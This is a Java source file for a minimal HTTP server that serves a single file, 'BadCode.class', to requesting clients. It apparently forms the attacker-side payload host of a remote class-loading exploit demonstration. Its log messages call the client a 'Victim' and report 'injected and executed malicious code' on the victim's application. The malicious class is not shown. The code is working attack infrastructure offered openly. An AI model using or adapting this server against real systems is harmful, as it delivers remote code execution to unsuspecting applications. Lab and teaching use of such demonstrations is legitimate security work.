import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Date;

public class HttpServer {

    public static void main(String[] args) {
        int port = 8082;
        
        try {
            SimpleHTTPServer server = new SimpleHTTPServer(port);
            server.start();
            System.out.println("HTTP Server listening on port " + port);
        } catch (IOException e) {
            System.err.println("Error starting HTTP Server: " + e.getMessage());
        }
    }

}

class SimpleHTTPServer {
    private int port;

    public SimpleHTTPServer(int port) {
        this.port = port;
    }

    public void start() throws IOException {
        com.sun.net.httpserver.HttpServer server = com.sun.net.httpserver.HttpServer.create(
                new java.net.InetSocketAddress(port),
                0
        );

        server.createContext("/BadCode.class", new FileHandler("Files/BadCode.class"));

        server.setExecutor(java.util.concurrent.Executors.newCachedThreadPool());
        server.start();
    }
}

class FileHandler implements com.sun.net.httpserver.HttpHandler {
	
	
	
    private String filePath;

    public FileHandler(String filePath) {
        this.filePath = filePath;
    }

    @Override
    public void handle(com.sun.net.httpserver.HttpExchange exchange) throws IOException {
	//System.out.println("" + filePath);

    	Date current = new Date();
        SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timestamp = format.format(current);
    	
        File file = new File(filePath);
        System.out.println(timestamp + " - Received HTTP Request from Victim");
        if (file.exists()) {
        	System.out.println(timestamp + " - Send HTTP Response to Victim");
            System.out.println(timestamp + " - Successfully injected and executed malicious code on victims application");
            Path path = Paths.get(filePath);
            byte[] fileBytes = Files.readAllBytes(path);

            exchange.sendResponseHeaders(200, fileBytes.length);
            exchange.getResponseBody().write(fileBytes);
            
        } else {
            System.out.println("File nicht gefunden");
            String response = "File not found";
            exchange.sendResponseHeaders(404, response.length());
            exchange.getResponseBody().write(response.getBytes());
        }

        exchange.close();
    }
}